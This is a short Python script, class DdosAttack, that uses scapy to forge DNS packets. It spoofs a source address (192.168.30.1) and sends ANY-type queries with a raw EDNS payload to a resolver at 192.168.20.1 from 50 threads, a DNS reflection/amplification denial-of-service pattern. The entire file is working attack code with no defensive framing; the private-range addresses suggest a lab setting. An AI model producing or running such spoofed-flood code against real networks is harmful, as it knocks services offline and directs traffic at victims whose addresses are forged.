from scapy.all import *
import time
import threading
dnsport = True

A= "192.168.30.1"
B= "192.168.20.1"

class DdosAttack(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def dns(self):
        D= "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        spoofed_packet = IP(src=A, dst=B) / UDP(sport=16863, dport=53) / D
        send(spoofed_packet)

for i in range(0, 50):
    dos = DdosAttack()
    t = threading.Thread(target=dos.dns)
    t.start()